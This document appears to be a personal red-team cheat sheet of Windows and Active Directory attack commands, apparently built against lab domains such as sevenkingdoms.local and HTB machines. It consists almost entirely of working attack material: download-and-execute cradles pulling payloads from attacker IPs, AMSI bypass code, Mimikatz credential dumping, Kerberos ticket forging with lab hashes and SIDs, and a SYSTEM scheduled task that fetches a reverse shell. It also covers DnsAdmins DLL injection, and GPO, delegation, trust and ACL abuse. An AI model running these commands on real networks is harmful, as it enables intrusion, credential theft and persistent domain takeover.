-------------------
In memory execution
-------------------
iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')

$ie = New-Object -ComObject InternetExplorer.Application
$ie.visible = $False
$ie.navigate('http://192.168.230.1/evil.ps1')
sleep 5
$response = $ie.Document.body.innerHTML
$ie.quit()
iex $response

iex (iwr 'http://192.168.1.16:8989/Invoke-Mimikatz.ps1')

$h = New-Object -ComObject Msxml2.XMLHTTP
$h.open('GET', 'http://192.168.230.1/evil.ps1', $false)
$h.send()
iex $h.responseText

-----------
AMSI bypass
-----------
$amsi = [AppDomain]::CurrentDomain.GetAssemblies() |
Where-Object { $_.FullName -like "*Management.Automation*" } |
ForEach-Object { $_.GetType("System.Management.Automation.AmsiUtils") }
$field = $amsi.GetField("amsiInitFailed", "NonPublic,Static")
$field.SetValue($null, $true)

$a = [Ref].Assembly.GetTypes() | ?{$_.Name -like '*siUtils'}
$b = $a.GetFields('NonPublic,Static') | ?{$_.Name -like '*siContext'}
[IntPtr]$c = $b.GetValue($null)
[Int32[]]$d = @(0xff)
[System.Runtime.InteropServices.Marshal]::Copy($d, 0, $c, 1)

---------------------
usefull commands
---------------------
whoami /all
tasklist /svc
systeminfo
get-hotfix | ft -autosize
gci \\.\pipe\

Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' | Select DefaultUserName, DefaultDomainName, DefaultPassword, AutoAdminLogon

Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -FilterXPath "*[System[(EventID=5007)]]" | Where-Object { $_.Message -like "*Exclusions\Paths*" } | Select-Object -Property TimeCreated, Id, Message | Format-List

if another session exists we can steal hash
RunasCs.exe x x qwinsta -l 9
./RunasCs.exe oorend '1GR8t@$$4u' -l 9 "c:\users\winrm_svc\documents\KrbRelay.exe -ntlm -session 1 -clsid 354FF91B-5E49-4BDC-A8E6-1CB6C6877182 -port 8080"

dir . /s
accesschk.exe /accepteula -uwds blazorized\rsa_4810 C:\Windows
Get-Clipboard
cmdkey /list
Get-ScheduledTask | Where-Object {$_.Principal.UserId -like "*$env:USERNAME*"}
Get-CimInstance Win32_Service | Where-Object { $_.StartName -like "*$env:USERNAME*" }
reg query HKCR\CLSID /s /f "7-zip"
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
dir "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
dir "$env:APPDATA" -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path . -Recurse -ErrorAction SilentlyContinue -Include *.txt, *.ini, *.yml, *.xml, *.ps1, *.cfg, *.bat |  Select-String -Pattern "pass" 
Get-ChildItem Env:

if the user in AD Recycle Bin Group :
get-adobject -filter 'isdeleted -eq $true' -includedeletedobjects

----------------------
enum using poweview.py
----------------------
Get-Domain
Get-DomainUser
Get-DomainUser -Properties Samaccountname,memberof,description
Get-DomainUser -spn
Get-DomainUser -spn -Properties servicePrincipalName 
Get-DomainUser -PreAuthNotRequired
Get-DomainUser -Admincount -Properties Samaccountname,memberof,description
Get-DomainComputer -Properties name,operatingSystem,samaccountname

Get-DomainGroup
Get-DomainGroup -Properties name,member
Get-DomainGroup -Identity "Domain Admins"
Get-DomainGroupMember -Identity "Domain Admins" 
Get-DomainGroup -AdminCount

Get-DomainTrust

--------------------- 
enum using Powershell
---------------------
$adclass = [system.directoryservices.activedirectory.domain]
$adclass::getcurrentdomain()
--
get-addomain
get-addomain -identity sevenkingdoms.local
(get-addomain).domainsid
get-addomaincontroller
get-addomaincontroller -domainname sevenkingdoms.local -discover
get-aduser -filter * -properties *
get-aduser -identity vagrant -properties *
get-aduser -filter * | select-object name
-
Get-ADUser -Filter * -Properties * | select name, @{expression={[datetime]::FromFileTime($_.pwdlastset)}}
Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name
-
get-aduser -filter * -properties description | where-object { $_.description } | select-object samaccountname, description
get-adcomputer -filter * -properties *
get-adcomputer -filter * | select-object name
get-adcomputer -filter * -properties operatingsystem | select-object name, operatingSystem
get-adgroup -filter * -properties *
get-adgroup -filter * | select-object name
get-adgroup -filter "name -like '*admin*'" | select name
get-adgroup -filter "name -like '*admin*'" -server north.sevenkingdoms.local | select name
get-adgroupmember -identity "administrators"
get-adgroupmember -identity "administrators" | select-object name 
get-adprincipalgroupmembership -identity vagrant | select name
get-gpo -all | select-object displayname
dsquery user -samid vagrant
get-adorganizationalunit -filter * -properties *
get-adorganizationalunit -filter * -properties * | select ObjectGUID
-
get-gpo -guid '{6AC1786C-016F-11D2-945F-00C04fB984F9}'
-
(get-acl "ad:\cn=administrator,cn=users,dc=sevenkingdoms,dc=local").access
get-adtrust -filter * -properties *
get-adtrust -filter * -properties * | select cn,source,target,direction
get-adtrust -server "sevenkingdoms.local" -filter * -properties *
get-adforest

$context = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("Forest", "essos.local")
[System.DirectoryServices.ActiveDirectory.Forest]::GetForest($context)

$forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest(); foreach ($domain in $forest.Domains) { try { $dcNames = $domain.DomainControllers | ForEach-Object { $_.Name } } catch { $dcNames = @() }; try { $parent = $domain.Parent.Name } catch { $parent = "" }; try { $pdc = $domain.PdcRoleOwner.Name } catch { $pdc = "" }; try { $rid = $domain.RidRoleOwner.Name } catch { $rid = "" }; try { $infra = $domain.InfrastructureRoleOwner.Name } catch { $infra = "" }; try { $modeLevel = [int]$domain.DomainMode.value__ } catch { $modeLevel = -1 }; [PSCustomObject]@{ Forest = $forest.Name; DomainControllers = $dcNames; Children = @(); DomainMode = $domain.DomainMode; DomainModeLevel = $modeLevel; Parent = $parent; PdcRoleOwner = $pdc; RidRoleOwner = $rid; InfrastructureRoleOwner = $infra; Name = $domain.Name } }

get-adtrust -filter 'msds-trustforesttrustinfo -ne "$null"'
get-adtrust -filter 'msds-trustforesttrustinfo -ne "$null"' -server sevenkingdoms.local
Get-ADComputer -Filter * -Properties DnsHostName | Select-Object -ExpandProperty DnsHostName | ForEach-Object { if (Test-Connection -ComputerName $_ -Count 1 -Quiet) { try { $null = Get-Item "\\$_\ADMIN$"; Write-Host "[+] You have admin access on: $_" -ForegroundColor Green } catch { Write-Host "[-] No admin access on: $_" -ForegroundColor Red } } else { Write-Host "[-] Host $_ is offline" -ForegroundColor Yellow } }

------------------------
enum using Powerview.ps1
------------------------
get-netdomain
get-netdomain -domain north.sevenkingdoms.loca
get-domainsid
-
get-domainpolicy
(get-domainpolicy).systemaccess
(get-domainpolicy).KerberosPolicy
(get-domainpolicy -domain north.sevenkingdoms.local).KerberosPolicy
-
get-netdomaincontroller
get-netdomaincontroller -domain north.sevenkingdoms.local
get-netuser 
get-netuser | select name
get-netuser -samaccountname vagrant
get-netuser | where-object { $_.description } | select samaccountname, description
get-netcomputer
(get-netcomputer).name  
get-netcomputer | select-object samaccountname,operatingsystem
get-netgroup 
(get-netgroup).name
get-netgroup "*admin*" | select-object samaccountname
get-netgroup -domain north.sevenkingdoms.local *admin* | select-object samaccountname
get-domaingroupmember -identity "administrators" -recurse
get-domaingroupmember -identity "administrators" -recurse | select-object membername
get-netgroup -username vagrant | select cn 
-
get-netlocalgroup -computername winterfell.north.sevenkingdoms.local 
get-netloggedon -computername winterfell.north.sevenkingdoms.local
get-lastloggedon -computername winterfell.north.sevenkingdoms.local
- 
-
invoke-sharefinder -verbose
invoke-filefinder -verbose
get-netfileserver -verbose
-
get-netgpo  
get-netgpo | select displayname
get-netgpo -computername winterfell.north.sevenkingdoms.local
get-netgpo -computername winterfell.north.sevenkingdoms.local | select displayname
-
find-gpolocation -samaccountname vagrant -verbose
-
(Get-DomainUser -SamAccountName vagrant).DistinguishedName
get-netou
get-netou | select gplink
Get-ObjectAcl -SamAccountName administrator
Get-ObjectAcl -DistinguishedName "cn=administrator,cn=users,dc=north,dc=sevenkingdoms,dc=local" 
-
Invoke-ACLScanner
-
get-netdomaintrust | select sourcename,targetname,trusttype,trustattributes,trustdirection
get-netdomaintrust -domain north.sevenkingdoms.local
get-netforest
get-adforest -identity north.sevenkingdoms.local
get-netforestdomain
Get-NetForestTrust
Get-NetForestTrust -forest essos.local
-
get-netuser -domain sevenkingdoms.local
-
$computer = get-netcomputer | select-object -expandproperty dnshostname
invoke-checklocaladminaccess -computername $computer
-
invoke-userhunter -checkaccess -verbose
-

------------------------------------------------
local privilege escalation using automated tools
------------------------------------------------
powerup.ps1
invoke-allchecks

privesc.ps1
invoke-privesc

winpeas.ps1

--------------------------------------------------------------------
domain enum using sharphound.ps1 | sharphound.exe | rusthound-ce.exe
--------------------------------------------------------------------

. .\sharphound.ps1
invoke-bloodhound -collectionmethod all -verbose
 
.\SharpHound.exe -c All

.\rusthound-ce.exe --domain <> --collectionmethod All --zip

----------------
lateral movement
----------------
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*"
Enter-PSSession -ComputerName 192.168.56.11 -Credential (New-Object System.Management.Automation.PSCredential("192.168.56.11\vagrant", (ConvertTo-SecureString "vagrant" -AsPlainText -Force)))

$session = New-PSSession -ComputerName 192.168.56.11 -Credential (New-Object System.Management.Automation.PSCredential("192.168.56.11\vagrant", (ConvertTo-SecureString "vagrant" -AsPlainText -Force)))
Enter-PSSession -Session $session

Get-PSSession
Enter-PSSession -Id <session ID>

$proc = Get-Process
exit $proc 

------------------
domain persistence
------------------
-
$h = New-Object -ComObject Msxml2.XMLHTTP
$h.open('GET', 'https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Gather/Invoke-Mimikatz.ps1', $false)
$h.send()
iex $h.responseText
-
Invoke-Mimikatz -Command "sekurlsa::logonpasswords" -> as local admin
secretsdump.py SEVENKINGDOMS/KINGSLANDING\$@kingslanding.sevenkingdoms.local -hashes :bf8886b5fa9d7fca01d845839003d0b9 -> to get domain admin hash via computer hash
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -> as domain admin to get krbtgt hash
 
* golden ticket

Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:sevenkingdoms.local /sid:S-1-5-21-3418017264-3487417002-2637089998 /krbtgt:18632eef159a778a742e632550faec1c /id:500 /ptt"'
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:sevenkingdoms.local /sid:S-1-5-21-3418017264-3487417002-2637089998 /krbtgt:18632eef159a778a742e632550faec1c /id:500 /ticket:admin.kirbi"'
ticketConverter.py admin.kirbi admin.ccache -> to use it with linux
----------------------------------------------------------------------------------------------------------------
1) krbtgt NT hash
2) domain sid

krbtgt:502:aad3b435b51404eeaad3b435b51404ee:18632eef159a778a742e632550faec1c::: ==> 18632eef159a778a742e632550faec1c
sevenkingdoms.local SID ==> S-1-5-21-3418017264-3487417002-2637089998

impacket-ticketer -nt '18632eef159a778a742e632550faec1c' -domain sevenkingdoms.local -domain-sid S-1-5-21-3418017264-3487417002-2637089998 Administrator 
export KRB5CCNAME=Administrator.ccache
impacket-wmiexec -k -no-pass 'sevenkingdoms.local/Administrator@kingslanding.sevenkingdoms.local' 
impacket-wmiexec -k -no-pass 'sevenkingdoms.local/Administrator@winterfell.north.sevenkingdoms.local'

* silver ticket

Invoke-Mimikatz -Command '"kerberos::golden domain:sevenkingdoms.local /sid:S-1-5-21-3418017264-3487417002-2637089998 /target:dc01.security.local /service:CIFS /rc4:<svc_acc hash> /user:administrator /ptt"'
Invoke-Mimikatz -Command '"kerberos::golden domain:sevenkingdoms.local /sid:S-1-5-21-3418017264-3487417002-2637089998 /target:dc01.security.local /service:HOST /rc4:<svc_acc hash> /user:administrator /ptt"' --> to run schtasks as system

schtasks /create /tn STCheck /sc onlogon /ru "NT Authority\SYSTEM" /tr "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.1.16:8080/Invoke-PowerShellTcp.ps1'')'"
schtasks /run /tn STCheck
-----------------------------------------------------------------------------------------------------------------
1) computer NT hash 
2) domain sid
 
SEVENKINGDOMS\KINGSLANDING$:aad3b435b51404eeaad3b435b51404ee:bf8886b5fa9d7fca01d845839003d0b9::: ==> bf8886b5fa9d7fca01d845839003d0b9
sevenkingdoms.local SID ==> S-1-5-21-3418017264-3487417002-2637089998

impacket-ticketer -nt 'bf8886b5fa9d7fca01d845839003d0b9' -domain sevenkingdoms.local -domain-sid S-1-5-21-3418017264-3487417002-2637089998 -spn cifs/kingslanding.sevenkingdoms.local Administrator 
export KRB5CCNAME=Administrator.ccache
impacket-wmiexec -k -no-pass 'sevenkingdoms.local/Administrator@kingslanding.sevenkingdoms.local'

* silver ticket against a service 
  - nt hash of sqlsvc acc
  - domain SID
  - SPN    
  => ticketer.py -nt 'B999A16500B87D17EC7F2E2A68778F05' -domain scrm.local -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -spn MSSQLSvc/dc1.scrm.local Administrator
 
* diamond ticket

1) krbtgt NT hash
2) krbtgt aes256 hash
3) domain sid
4) target userID
5) group sid
6) valid user creds 

SEVENKINGDOMS\KINGSLANDING$:aad3b435b51404eeaad3b435b51404ee:bf8886b5fa9d7fca01d845839003d0b9::: ==> bf8886b5fa9d7fca01d845839003d0b9
krbtgt:aes256-cts-hmac-sha1-96:9a6f1e4fcef9c9159f82af0626a1683206350b1d1c2ef337b81c99a3c1cf81ff ==> 9a6f1e4fcef9c9159f82af0626a1683206350b1d1c2ef337b81c99a3c1cf81ff
sevenkingdoms.local SID ==> S-1-5-21-3418017264-3487417002-2637089998
administrator rid => 500
domain admins rid => 512
creds => vagrant:vagrant

impacket-ticketer -request -nthash 'bf8886b5fa9d7fca01d845839003d0b9' -aesKey 9a6f1e4fcef9c9159f82af0626a1683206350b1d1c2ef337b81c99a3c1cf81ff -domain sevenkingdoms.local -domain-sid S-1-5-21-3418017264-3487417002-2637089998 -user-id 500 -groups 512 Administrator -user vagrant -password vagrant
export KRB5CCNAME=Administrator.ccache
impacket-wmiexec -k -no-pass 'sevenkingdoms.local/administrator@kingslanding.sevenkingdoms.local'

* sapphire ticket

1) krbtgt NT hash
2) krbtgt aes256 hash
3) domain sid
4) target user
5) target userID
6) valid user creds

SEVENKINGDOMS\KINGSLANDING$:aad3b435b51404eeaad3b435b51404ee:bf8886b5fa9d7fca01d845839003d0b9::: ==> bf8886b5fa9d7fca01d845839003d0b9
krbtgt:aes256-cts-hmac-sha1-96:9a6f1e4fcef9c9159f82af0626a1683206350b1d1c2ef337b81c99a3c1cf81ff ==> 9a6f1e4fcef9c9159f82af0626a1683206350b1d1c2ef33>
sevenkingdoms.local SID ==> S-1-5-21-3418017264-3487417002-2637089998
target user => administrator
administrator rid => 500
creds => vagrant:vagrant

impacket-ticketer -request -impersonate Administrator -nthash 'bf8886b5fa9d7fca01d845839003d0b9' -aesKey 9a6f1e4fcef9c9159f82af0626a1683206350b1d1c2ef337b81c99a3c1cf81ff -domain sevenkingdoms.local -domain-sid S-1-5-21-3418017264-3487417002-2637089998 -user-id 500 Administrator -user vagrant -password vagrant
export KRB5CCNAME=Administrator.ccache                       
impacket-wmiexec -k -no-pass 'sevenkingdoms.local/administrator@kingslanding.sevenkingdoms.local'
impacket-wmiexec -k -no-pass 'sevenkingdoms.local/administrator@winterfell.north.sevenkingdoms.local'

* skeleton key  

Invoke-Mimikatz -Command '"misc::skeleton"'

* DSRM 

Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
wmiexec.py -hashes :c66d72021a2d4744409969a581a1705e Administrator@192.168.56.10 

* ACLs - RightAbuse

Add-ObjectAcl -TargetDistinguishedName 'DC=sevenkingdoms,DC=local' -PrincipalSamAccountName vagrant -Rights All -Verbose
or
Set-ADACL -DistinguishedName 'DC=sevenkingdoms,DC=local' -Principal vagrant -Verbose
then DCsync as any user
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:sevenkingdoms.local /user:administrator@sevenkingdoms.local"'
   
* ACLS - adminSDholder

Add-ObjectAcl -TargetDistinguishedName 'CN=AdminSDHolder,CN=System,DC=sevenkingdoms,DC=local' -PrincipalSamAccountName vagrant -Rights All -Verbose
now we can add vagrant as domain admin 
Add-ADGroupMember -Identity "Domain Admins" -Members vagrant

* ACLs - security descriptors

Add-ObjectAcl -TargetDistinguishedName "CN=Domain Admins,CN=Users,DC=sevenkingdoms,DC=local" -PrincipalSamAccountName vagrant -Rights All -Verbose
Add-ADGroupMember -Identity "Domain Admins" -Members vagrant

---------------------------
domain privilege escalation
---------------------------
* kerberoast 

get-netuser -spn 
get-netuser -spn | select serviceprincipalname
or 
get-aduser -filter {serviceprincipalname -ne "$null"} -properties serviceprincipalname

Rubeus.exe asktgt /user:vagrant /password:vagrant /domain:omar.local /dc:DC01.omar.local /outfile:tgt.kirbi
Rubeus.exe asktgs /service:mssqlsvc/omar.local /ticket:tgt.kirbi /outfile:tgs.kirbi

then crack tgs to get password of svc

* AS-REPs

get-aduser -filter {DoesNotRequirePreauth -eq $True}  -properties DoesNotRequirePreauth  | select userprincipalname

* UnconstrainedDelegation 
get-netcomputer -unconstrained
or
get-adcomputer -filter {trustedfordelegation -eq $true}
get-aduser -filter {trustedfordelegation -eq $true}

Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
.\Rubeus.exe ptt /ticket:"C:\Users\vagrant\Documents\[0;3e7]-2-0-60a10000-KINGSLANDING$@krbtgt-SEVENKINGDOMS.LOCAL.kirbi"
or
Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\vagrant\Documents\[0;3e7]-2-0-60a10000-KINGSLANDING$@krbtgt-SEVENKINGDOMS.LOCAL.kirbi"'
dir \\kingslanding.sevenkingdoms.local\c$
--------------------------------------------------------------------------------------
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x142eb8 /nowrap
.\Rubeus.exe ptt /ticket:<base64 ticket>
dir \\ROOT-DC01\C$
Enter-PSSession -ComputerName ROOT-DC01

cat admin.64 | base64 -d > admin.kirbi
ticketConverter.py admin.kirbi admin.ccache
export KRB5CCNAME=admin.ccache 
proxychains4 -q impacket-wmiexec -k BYTESHIELD.LOCAL/Administrator@ROOT-DC01.BYTESHIELD.LOCAL -no-pass
 
* ConstrainedDelegation
Get-ADComputer -Filter * -Properties msDS-AllowedToDelegateTo, userAccountControl | Select-Object Name, msDS-AllowedToDelegateTo, userAccountControl
Get-ADUser -filter * -Properties msDS-AllowedToDelegateTo, userAccountControl | Select SamAccountName, msDS-AllowedToDelegateTo, userAccountControl

Rubeus.exe asktgt /user:candie.aggi /rc4:<NTLM_HASH> /domain:omar.local /ptt
Rubeus.exe s4u /user:candie.aggi /rc4:<NTLM_HASH> /impersonateuser:Administrator /domain:omar.local /service:cifs/DC01.omar.local /ptt
Rubeus.exe s4u /user:candie.aggi /rc4:<NTLM_HASH> /impersonateuser:Administrator /domain:omar.local /msdsspn:cifs/DC01.omar.local /ptt
dir \\DC01.omar.local\c$
--------------------------------------------------------------------------------------
proxychains findDelegation.py ROOT-DC01.BYTESHIELD.local/administrator:Qwer@123 -target-domain BYTESHIELD.local
proxychains impacket-getST -spn cifs/ROOT-DC01 -impersonate Administrator -aesKey ba188b097bb6b9305275fde8b5c7bfadc554a62b9882fd248db97fc24abc3a4d 'BYTESHIELD/DMZ-SRV$' -dc-ip 10.10.1.18
proxychains secretsdump.py -no-pass -k ROOT-DC01       

sometimes we can use -self 
impacket-getST -spn http/dc01.rebound.htb -impersonate Administrator -hashes :ae98843c256f0de6f6d16a93a6e0dfe3 'rebound.htb/delegator$' -dc-ip dc01.rebound.htb -self
if -self not works we can use RBCD by add user to delegate delegator$ then cuz delegator$ has constrained delegation over dc01 that user can impersonate dc01$ 
impacket-rbcd 'rebound.htb/delegator$' -hashes :ae98843c256f0de6f6d16a93a6e0dfe3 -k -delegate-from ldap_monitor -delegate-to delegator$ -action write -dc-ip dc01 -use-ldaps
getST.py rebound.htb/ldap_monitor:'1GR8t@$$4u' -spn browser/dc01.rebound.htb -impersonate DC01$
after that we came back using the user's TGS  
getST.py rebound.htb/delegator\$ -hashes :ae98843c256f0de6f6d16a93a6e0dfe3 -spn http/dc01.rebound.htb -additional-ticket DC01\$.ccache -impersonate DC01$
export KRB5CCNAME=DC01\$.ccache 
secretsdump.py -k -dc-ip dc01.rebound.htb dc01.rebound.htb
 
* Resource-Based ConstrainedDelegation (RBCD)
the key of this attack the user who will create the computer must have write permission on the target DC/server to create rbcd between DC/server and the created computer

addcomputer.py -computer-name 'omar$' -computer-pass 'Qwer@123' -dc-host 'kingslanding' 'sevenkingdoms.local/vagrant:vagrant' 

impacket-rbcd -delegate-from omar$ -delegate-to kingslanding$ -dc-ip kingslanding -action write 'sevenkingdoms.local/vagrant:vagrant'
or
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$
 
impacket-getST -spn cifs/kingslanding -impersonate Administrator -dc-ip 192.168.56.10 sevenkingdoms.local/omar$:Qwer@123
impacket-secretsdump -k -no-pass kingslanding 

to clean 

impacket-rbcd -delegate-from omar$ -delegate-to kingslanding$ -dc-ip kingslanding -action flush 'sevenkingdoms.local/vagrant:vagrant'
addcomputer.py -computer-name 'omar$' -computer-pass 'Qwer@123' -dc-host 'kingslanding' 'sevenkingdoms.local/vagrant:vagrant' -delete
 
---
RBCD with maq 0
---

rbcd.py -delegate-from 'wsilva' -delegate-to 'DC$' -dc-ip '10.129.145.216' -action 'write' 'phantom.vl'/'wsilva':'Qwer@123'
NTLM=$(echo -n 'Qwer@123' | iconv -f UTF-8 -t UTF-16LE | openssl dgst -md4 | awk '{print $2}')
getTGT.py -hashes :$NTLM 'phantom.vl'/'wsilva'
export KRB5CCNAME=wsilva.ccache
describeTicket.py wsilva.ccache | grep 'Ticket Session Key'  
smbpasswd.py -newhashes :a2b826d07767cd633b8468a088984560 'phantom.vl'/'wsilva':'Qwer@123'@'DC.phantom.vl'
getST.py -k -no-pass -u2u -impersonate "Administrator" -spn "cifs/DC.phantom.vl" 'phantom.vl'/'wsilva' 
export KRB5CCNAME=Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache
impacket-secretsdump -k  DC.phantom.vl
 
* abuse Dnsadmins

--> to verify we are in dnsadmins group
get-netgroupmember dnsadmins
or
get-adgroupmember -identity dnsadmins

msfvenom -p windows/x64/exec cmd='net user administrator Qwer@123 /domain' -f dll > dns.dll
sudo smbserver.py share ./
cmd /c dnscmd localhost /config /serverlevelplugindll \\10.10.14.9\share\dns.dll
sc.exe stop dns
sc.exe start dns

* abuse GPO 

Get-GPO -All | Select-Object DisplayName, Id
python3 pygpoabuse.py baby2.vl/GPOADM:'Qwer@123' -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9" -command 'net localgroup administrators GPOADM /add' -f

from Windows :
  => Get-GPO -All | Select-Object DisplayName, Id
  => .\SharpGPOAbuse.exe --AddLocalADmin --UserAccount HHogan --GPOName "Default Domain Policy"
  => gpupdate /force

--------------------
domain trust attacks
--------------------
* domain trust abuse via golden ticket

forest domain : sevenkingdoms.local
forest sid : S-1-5-21-3418017264-3487417002-2637089998
child domain : north.sevenkingdoms.local
child sid : S-1-5-21-3859741385-999036673-2266035477
krbtgt NT hash of child domain : krbtgt:502:aad3b435b51404eeaad3b435b51404ee:04f8f53d0a9d563cbace1485271227d2:::
enterprise admin sid : 519

impacket-ticketer -domain north.sevenkingdoms.local -domain-sid S-1-5-21-3859741385-999036673-2266035477 -nthash 04f8f53d0a9d563cbace1485271227d2 -user-id 500 -extra-sid S-1-5-21-3418017264-3487417002-2637089998-519 -extra-pac -duration 1 administrator
export KRB5CCNAME=administrator.ccache 
impacket-getST -spn cifs/kingslanding.sevenkingdoms.local north.sevenkingdoms.local/administrator -no-pass -k
export KRB5CCNAME=administrator@cifs_kingslanding.sevenkingdoms.local@SEVENKINGDOMS.LOCAL.ccache 
impacket-secretsdump 'north.sevenkingdoms.local/administrator@kingslanding.sevenkingdoms.local' -k -no-pass 
impacket-smbexec 'north.sevenkingdoms.local/administrator@kingslanding.sevenkingdoms.local' -k -no-pass  
 
to automate all this impacket-raiseChild -target-exec sevenkingdoms.local 'north.sevenkingdoms.local/administrator' -hashes :dbd13e1c4e338284ac4e9874f7de6ef4 -k 

* domain trust abuse via trust key

NT hash of domain computer => SEVENKINGDOMS$:1104:aad3b435b51404eeaad3b435b51404ee:234783fc9acc9d51eff9ee314efe40ba:::
child domain : north.sevenkingdoms.local
child sid : S-1-5-21-3859741385-999036673-2266035477
forest sid : S-1-5-21-3418017264-3487417002-2637089998
enterprise admin sid : 519

impacket-ticketer -domain 'north.sevenkingdoms.local' -domain-sid 'S-1-5-21-3859741385-999036673-2266035477' -nthash '234783fc9acc9d51eff9ee314efe40ba' -extra-sid 'S-1-5-21-3418017264-3487417002-2637089998-519' -spn 'krbtgt/sevenkingdoms.local' trustkey
export KRB5CCNAME=trustkey.ccache 
impacket-getST -k -no-pass -spn 'cifs/kingslanding.sevenkingdoms.local' 'SEVENKINGDOMS.LOCAL/trustkey'
export KRB5CCNAME=trustkey@cifs_kingslanding.sevenkingdoms.local@SEVENKINGDOMS.LOCAL.ccache 
impacket-secretsdump 'trustkey@kingslanding.sevenkingdoms.local' -k -no-pass
impacket-smbexec 'trustkey@kingslanding.sevenkingdoms.local' -k -no-pass
                                                                
------------------
crossforestattacks
------------------
* access forest using trust ticket

Invoke-Mimikatz -command '"lsadump::lsa /patch"'
or
Invoke-Mimikatz -command '"lsadump::trust /patch"'

we get essos hash then

Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:sevenkingdoms.local /sid:S-1-5-21-3418017264-3487417002-2637089998 /rc4:b8f907be05ffcc2c20a450bd59a766a1 /service:krbtgt /target:essos.local"'

after that we ask for tgs but before that we inject tgt

Invoke-Mimikatz -Command '"kerberos::ptt ticket.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ask /target:essos.local /service:TERMSRV/meereen.essos.local"'
  
then we inject tgs

Invoke-Mimikatz -Command '"kerberos::ptt tgs.kirbi"'
--------------------------------------------------------------------------------------------
* crossforesttrust abuse via golden ticket 

target forest domain => sevenkingdoms.local
target forest domain sid => S-1-5-21-3418017264-3487417002-2637089998
compromised forest domain => essos.local 
compromised forest domain sid => S-1-5-21-2748863469-1367384373-3207808320
compromised forest domain krbtgt NT hash => 69672c5ca15623e3237f8fba73787fd5
target forest domain group rid > 1000 and has privs and sid history is enabled => 1111 SEVENKINGDOMS\DragonRider
ldapsearch -x -H ldap://192.168.56.10 \
  -D "sevenkingdoms\\vagrant" \
  -w "vagrant" \
  -b "DC=sevenkingdoms,DC=local" \
  "(sAMAccountName=DragonRider)" \
  sAMAccountName adminCount memberOf

impacket-ticketer -nthash 69672c5ca15623e3237f8fba73787fd5 -domain-sid S-1-5-21-2748863469-1367384373-3207808320 -domain essos.local -extra-sid S-1-5-21-3418017264-3487417002-2637089998-1111 administrator      
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass administrator@kingslanding.sevenkingdoms.local 
impacket-secretsdump -k -no-pass administrator@kingslanding.sevenkingdoms.local  
 
* crossforesttrust abuse via trust key 

target forest domain => sevenkingdoms.local
target forest domain sid => S-1-5-21-3418017264-3487417002-2637089998
compromised forest domain => essos.local
compromised forest domain sid => S-1-5-21-2748863469-1367384373-3207808320
compromised forest domain $DOMAIN NT hash => SEVENKINGDOMS$:1105:aad3b435b51404eeaad3b435b51404ee:2438c8ddcc3b98cda1706a237a7a2113:::
target forest domain group rid > 1000 and has privs and sid history is enabled => 1111 SEVENKINGDOMS\DragonRider
ldapsearch -x -H ldap://192.168.56.10 \
  -D "sevenkingdoms\\vagrant" \
  -w "vagrant" \
  -b "DC=sevenkingdoms,DC=local" \
  "(sAMAccountName=DragonRider)" \
  sAMAccountName adminCount memberOf

impacket-ticketer -nthash 2438c8ddcc3b98cda1706a237a7a2113 -domain-sid S-1-5-21-2748863469-1367384373-3207808320 -domain essos.local -extra-sid S-1-5-21-3418017264-3487417002-2637089998-1111 -spn 'krbtgt/sevenkingdoms.local' trustkey
export KRB5CCNAME=trustkey.ccache
impacket-getST -k -no-pass -spn 'cifs/kingslanding.sevenkingdoms.local' 'sevenkingdoms.local/trustkey@evenkingdoms.local' -dc-ip 192.168.56.10 
export KRB5CCNAME=trustkey@evenkingdoms.local@cifs_kingslanding.sevenkingdoms.local@SEVENKINGDOMS.LOCAL.ccache
impacket-psexec -k -no-pass trustkey@kingslanding.sevenkingdoms.local
impacket-secretsdump -k -no-pass trustkey@kingslanding.sevenkingdoms.local

------------
abusing ACLs
------------
* forcechangepass

net rpc password 'omar' 'Qwer@123' -U sevenkingdoms.local/vagrant%vagrant -S kingslanding.sevenkingdoms.local
bloodyAD --host "dc01.rebound.htb" -d "rebound.htb" -u "oorend" -k set password "WINRM_SVC" 'P@ssw0rd!123'

=> from windows :
   $cred = ConvertTo-SecureString 'Qwer@123' -AsPlainText -Force
   Set-ADAccountPassword -Identity "gpoadm" -NewPassword $cred -Reset 
 
* genericwrite

certipy-ad shadow auto -u vagrant@192.168.56.10 -p vagrant -account omar 

* writeowner

owneredit.py -new-owner 'sam' -target 'john' -action write tombwatcher.htb/sam:Qwer@123

bloodyAD --host DC.hercules.htb -d hercules.htb -u Auditor  -k set owner 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' Auditor
 
* writedacl

dacledit.py -action read -principal vagrant -target ROBERT.BARATHEON sevenkingdoms.local/vagrant:vagrant
dacledit.py -action write -rights FullControl -principal vagrant -target ROBERT.BARATHEON sevenkingdoms.local/vagrant:vagrant 
